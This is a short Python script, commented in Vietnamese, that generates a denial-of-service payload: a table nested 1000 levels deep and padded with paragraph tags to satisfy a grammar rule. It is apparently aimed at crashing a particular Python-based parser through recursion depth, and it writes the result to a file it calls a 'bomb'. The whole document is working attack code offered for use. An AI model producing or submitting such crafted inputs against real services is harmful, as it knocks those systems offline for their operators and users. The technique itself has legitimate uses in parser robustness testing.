# Độ sâu đệ quy (1000 là đủ để đánh sập Python parser)
depth = 1000

# Khởi tạo một cái bảng hợp lệ (có 2 hàng, mỗi hàng 1 ô, mỗi ô chứa 2 thẻ <p>)
payload = "<table><tr><td><p>A</p><p>A</p></td></tr><tr><td><p>A</p><p>A</p></td></tr></table>"

for _ in range(depth):
    # Lồng cái bảng hiện tại vào một cái bảng mới.
    # Thêm thẻ <p>A</p> kế bên payload để đảm bảo quy tắc EList luôn có chẵn (2) phần tử.
    payload = f"<table><tr><td>{payload}<p>A</p></td></tr><tr><td><p>A</p><p>A</p></td></tr></table>"

# Bọc toàn bộ vào thẻ <doc>, cũng thêm 1 thẻ <p>A</p> để chẵn phần tử
final_payload = f"<doc>{payload}<p>A</p></doc>"

# Ghi ra file
with open("bomb.txt", "w") as f:
    f.write(final_payload)
print("Đã tạo xong quả bom! Hãy copy nội dung trong file bomb.txt")